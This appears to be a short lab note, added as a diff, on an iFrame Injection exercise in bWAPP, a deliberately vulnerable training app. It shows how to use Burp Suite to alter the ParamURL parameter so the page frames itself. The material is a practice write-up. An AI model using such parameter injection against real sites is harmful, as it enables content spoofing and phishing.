@@ -1,0 +1,10 @@
+The page has an iframe
+<h1>iFrame Injection</h1>
+<iframe frameborder="0" src="robots.txt" height="250" width="250"><iframe>
+The robots.txt parameter is seen in the URL. 
+Look at the request in Burpsuite and alter the URL like so:
+
+/bWAPP/iframei.php?ParamURL=iframei.php?ParamWidth=250&ParamHeight=250 HTTP/1.1
+
+Result: The webpage is injected into itself. 
+<iframe frameborder="0" src="iframei.php" height="250" width="250"><iframe>
